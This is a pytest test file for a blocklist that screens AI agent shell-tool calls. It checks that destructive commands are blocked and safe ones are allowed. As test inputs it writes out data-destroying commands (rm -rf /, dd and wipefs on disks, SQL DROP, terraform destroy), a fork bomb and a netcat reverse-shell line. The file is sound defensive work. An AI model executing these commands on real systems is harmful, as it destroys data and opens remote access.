"""Tests for the destructive command blocklist."""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from guardian.blocklist import BlocklistResult, check_blocklist


class TestCheckBlocklist:
    """Test check_blocklist() against known-dangerous commands."""

    # --- Dangerous commands that MUST be blocked ---

    @pytest.mark.parametrize(
        "command,description",
        [
            ("rm -rf /", "rm -rf root"),
            ("rm -rf /home/user", "rm -rf absolute path"),
            ("rm -rf ~/Documents", "rm -rf home path"),
            ("rm -fr /tmp/data", "rm -fr variant"),
            ("sudo rm -rf /var", "sudo rm -rf"),
            ("rm -rf --no-preserve-root /", "rm -rf with flags"),
        ],
    )
    def test_blocks_rm_rf(self, command: str, description: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked, f"Should block: {description}"
        assert result.pattern_matched
        assert result.reason

    @pytest.mark.parametrize(
        "command",
        [
            "git reset --hard",
            "git reset --hard HEAD~3",
            "git reset --hard origin/main",
        ],
    )
    def test_blocks_git_reset_hard(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    @pytest.mark.parametrize(
        "command",
        [
            "git push --force",
            "git push -f origin main",
            "git push --force-with-lease origin main",
        ],
    )
    def test_blocks_git_force_push(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    @pytest.mark.parametrize(
        "command",
        [
            "DROP TABLE users;",
            "drop database production;",
            "DROP SCHEMA public CASCADE;",
            "DROP INDEX idx_users;",
        ],
    )
    def test_blocks_sql_drop(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    def test_blocks_truncate_table(self) -> None:
        result = check_blocklist("exec", {"command": "TRUNCATE TABLE users;"})
        assert result.blocked

    @pytest.mark.parametrize(
        "command",
        [
            "mkfs.ext4 /dev/sda1",
            "mkfs -t xfs /dev/nvme0n1",
        ],
    )
    def test_blocks_mkfs(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    @pytest.mark.parametrize(
        "command",
        [
            "dd if=/dev/zero of=/dev/sda",
            "dd if=image.iso of=/dev/sdb bs=4M",
        ],
    )
    def test_blocks_dd(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    def test_blocks_terraform_destroy(self) -> None:
        result = check_blocklist("exec", {"command": "terraform destroy -auto-approve"})
        assert result.blocked

    def test_blocks_kubectl_delete_namespace(self) -> None:
        result = check_blocklist("exec", {"command": "kubectl delete namespace production"})
        assert result.blocked

    def test_blocks_kubectl_delete_ns(self) -> None:
        result = check_blocklist("exec", {"command": "kubectl delete ns staging"})
        assert result.blocked

    def test_blocks_docker_system_prune(self) -> None:
        result = check_blocklist("exec", {"command": "docker system prune -af"})
        assert result.blocked

    @pytest.mark.parametrize(
        "command",
        [
            "chmod 777 /",
            "chmod -R 777 /etc",
            "chmod 0777 /var",
        ],
    )
    def test_blocks_chmod_777(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    @pytest.mark.parametrize(
        "command",
        [
            "shutdown -h now",
            "shutdown -r now",
            "poweroff",
            "reboot",
            "init 0",
            "init 6",
        ],
    )
    def test_blocks_shutdown(self, command: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert result.blocked

    def test_blocks_fork_bomb(self) -> None:
        result = check_blocklist("exec", {"command": ":(){ :|:& };:"})
        assert result.blocked

    def test_blocks_netcat_reverse_shell(self) -> None:
        result = check_blocklist("exec", {"command": "nc -e /bin/bash 10.0.0.1 4444"})
        assert result.blocked

    def test_blocks_wipefs(self) -> None:
        result = check_blocklist("exec", {"command": "wipefs -a /dev/sda"})
        assert result.blocked

    def test_blocks_write_to_disk_device(self) -> None:
        result = check_blocklist("exec", {"command": "echo 'data' > /dev/sda"})
        assert result.blocked

    # --- Safe commands that must NOT be blocked ---

    @pytest.mark.parametrize(
        "command,description",
        [
            ("ls -la", "list files"),
            ("git status", "git status"),
            ("git commit -m 'fix bug'", "git commit"),
            ("git push origin main", "git push (no force)"),
            ("git reset --soft HEAD~1", "git soft reset"),
            ("python -m pytest tests/", "run tests"),
            ("rm temp.txt", "rm single file (no -rf)"),
            ("cat /etc/hosts", "read file"),
            ("echo hello", "echo"),
            ("docker build .", "docker build"),
            ("docker run nginx", "docker run"),
            ("kubectl get pods", "kubectl get"),
            ("kubectl delete pod my-pod", "kubectl delete pod (not namespace)"),
            ("terraform plan", "terraform plan"),
            ("terraform apply", "terraform apply"),
            ("npm install", "npm install"),
            ("pip install requests", "pip install"),
            ("chmod 755 script.sh", "chmod 755"),
            ("chmod +x script.sh", "chmod +x"),
            ("SELECT * FROM users;", "SQL SELECT"),
            ("CREATE TABLE users (id INT);", "SQL CREATE"),
            ("dd --help", "dd help"),
        ],
    )
    def test_allows_safe_commands(self, command: str, description: str) -> None:
        result = check_blocklist("exec", {"command": command})
        assert not result.blocked, f"Should allow: {description}"

    # --- Tool scoping ---

    def test_skips_non_shell_tools(self) -> None:
        """Blocklist should only apply to exec/shell-type tools."""
        result = check_blocklist("send_email", {"command": "rm -rf /"})
        assert not result.blocked

    def test_checks_host_exec(self) -> None:
        result = check_blocklist("host_exec", {"command": "rm -rf /"})
        assert result.blocked

    def test_checks_coding(self) -> None:
        result = check_blocklist("coding", {"command": "rm -rf /"})
        assert result.blocked

    # --- Argument key handling ---

    def test_checks_cmd_arg(self) -> None:
        result = check_blocklist("exec", {"cmd": "rm -rf /"})
        assert result.blocked

    def test_checks_script_arg(self) -> None:
        result = check_blocklist("exec", {"script": "rm -rf /"})
        assert result.blocked

    def test_checks_code_arg(self) -> None:
        result = check_blocklist("exec", {"code": "rm -rf /"})
        assert result.blocked

    def test_checks_shell_command_arg(self) -> None:
        result = check_blocklist("exec", {"shell_command": "rm -rf /"})
        assert result.blocked

    def test_empty_input_passes(self) -> None:
        result = check_blocklist("exec", {})
        assert not result.blocked

    def test_no_command_args_passes(self) -> None:
        result = check_blocklist("exec", {"format": "json", "verbose": True})
        assert not result.blocked


class TestBlocklistResult:
    """Test the BlocklistResult dataclass."""

    def test_default_not_blocked(self) -> None:
        r = BlocklistResult(blocked=False)
        assert not r.blocked
        assert r.pattern_matched == ""
        assert r.reason == ""

    def test_blocked_with_details(self) -> None:
        r = BlocklistResult(
            blocked=True,
            pattern_matched=r"\brm\s+.*",
            reason="Destructive command blocked: rm -rf",
        )
        assert r.blocked
        assert r.pattern_matched
        assert "rm" in r.reason


class TestGuardianIntegration:
    """Test blocklist integration with Guardian.validate_action()."""

    @pytest.fixture
    def policy_file(self, tmp_path: Path) -> Path:
        p = tmp_path / "policy.yaml"
        p.write_text(
            textwrap.dedent("""\
            allow:
              - exec
              - host_exec
              - coding
              - check_weather
            review:
              - send_*
            deny:
              - delete_*
        """)
        )
        return p

    @pytest.fixture
    def guardian(self, policy_file: Path):
        from guardian.core import Guardian
        from guardian.types import (
            AuditConfig,
            CoherenceConfig,
            DriftConfig,
            FastClassifierConfig,
            GuardianConfig,
            LLMJudgeConfig,
            NetworkPolicyConfig,
            OverrideConfig,
            PipelineConfig,
            PolicyConfig,
        )

        return Guardian(
            GuardianConfig(
                enabled=True,
                fast_classifier=FastClassifierConfig(enabled=False),
                llm_judge=LLMJudgeConfig(enabled=False),
                policy=PolicyConfig(enabled=True, policy_file=str(policy_file)),
                audit=AuditConfig(enabled=False),
                coherence=CoherenceConfig(enabled=False),
                drift=DriftConfig(enabled=False),
                network_policy=NetworkPolicyConfig(enabled=False),
                pipeline=PipelineConfig(),
                overrides=OverrideConfig(enabled=False),
            )
        )

    def test_blocklist_denies_before_policy_allow(self, guardian) -> None:
        """Even if policy allows 'exec', blocklist should still deny destructive commands."""
        decision = guardian.validate_action("exec", {"command": "rm -rf /"})
        assert decision.verdict.value == "deny"
        assert "blocklist" in decision.matched_rule
        assert "Destructive command" in decision.reason

    def test_blocklist_passes_safe_commands(self, guardian) -> None:
        """Safe commands should pass blocklist and be allowed by policy."""
        decision = guardian.validate_action("exec", {"command": "ls -la"})
        assert decision.verdict.value == "allow"

    def test_blocklist_skips_non_shell_tools(self, guardian) -> None:
        """Non-shell tools should bypass the blocklist entirely."""
        decision = guardian.validate_action("check_weather", {"location": "rm -rf /"})
        assert decision.verdict.value == "allow"

    def test_blocklist_deny_not_overridable(self, guardian) -> None:
        """Blocklist should deny even if the tool would normally be allowed."""
        # terraform destroy through exec — policy allows exec, blocklist denies
        decision = guardian.validate_action("exec", {"command": "terraform destroy"})
        assert decision.verdict.value == "deny"
        assert "blocklist" in decision.matched_rule
